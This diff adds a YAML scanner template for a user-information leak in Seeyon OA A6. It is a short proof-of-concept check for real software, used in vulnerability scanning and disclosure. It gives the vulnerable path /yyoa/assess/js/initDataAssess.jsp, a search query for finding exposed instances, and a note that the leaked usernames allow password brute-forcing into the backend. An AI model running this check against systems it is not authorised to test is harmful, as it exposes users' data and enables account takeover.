@@ -1,0 +1,20 @@
+name: Seeyon OA A6 initDataAssess.jsp User information leakage
+manual: true
+query: app="Yonyou-Seeyon-OA" && body="致远协创A6"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/assess/js/initDataAssess.jsp
+    expression: response.status == 200 && response.body.bcontains(b"personList") &&
+      !response.body.bcontains(b"/yyoa/index.jsp")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: |-
+    Seeyon OA A6 initDataAssess.jsp There is leakage of user sensitive information
+    You can get the user name blasting user password into the background to further attack
+  tags: Disclosure of Sensitive Information
